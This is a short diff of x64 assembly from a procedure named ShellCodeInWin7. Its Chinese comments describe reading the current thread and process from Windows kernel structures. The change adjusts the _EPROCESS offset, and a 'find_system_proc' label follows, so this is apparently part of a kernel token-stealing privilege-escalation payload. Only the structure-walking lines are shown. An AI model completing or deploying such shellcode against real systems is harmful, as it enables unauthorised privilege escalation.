@@ -6,7 +6,7 @@ ShellCodeInWin7 proc
 	; 从KPCR中获取当前线程_ETHREAD
 	mov rax, gs:[188h]
 	; 从_ETHREAD中获取当前进程_EPROCESS
-	mov rax, [rax+0B8h]	
+	mov rax, [rax+070h]	
 	mov r8, rax
 	
 find_system_proc:
